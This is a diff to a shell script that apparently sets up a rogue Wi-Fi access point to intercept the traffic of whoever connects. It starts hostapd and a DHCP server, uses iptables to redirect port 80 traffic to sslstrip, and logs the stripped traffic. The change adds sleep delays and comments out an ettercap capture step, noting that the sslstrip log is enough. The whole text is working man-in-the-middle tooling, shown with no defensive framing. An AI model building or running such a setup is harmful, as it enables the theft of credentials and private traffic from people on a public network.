@@ -17,6 +17,7 @@ function StartAP(){
 	echo "starting AP"
 	tmux new-session -d -s AccessPoint 'hostapd -dd /tmp/tempHostapd.conf'
 	tmux detach -s AccessPoint
+	sleep 1
 	SetupDHCP
 }
 function SetupDHCP(){
@@ -34,13 +35,15 @@ function SetupDHCP(){
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
 	dhcpd -cf ./dhcpd.conf -pf /var/run/dhcpd.pid $WlanInterface
+	sleep 1
 	StartSSLstrip
 }
 
 function StartSSLstrip(){
 	tmux new-session -d -s SSLstrip 'sslstrip -f -p -k 10000'
 	tmux detach -s SSLstrip
-	StartEtterCap
+	#not needed you can find the sslstrip log at: /sslstrip.log
+	#StartEtterCap
 }
 function StartEtterCap(){
 	tmux new-session -d -s EtterCap 'ettercap -p -u -T -q -i $WlanInterface >> /home/alarm/OutputEttercap.txt'
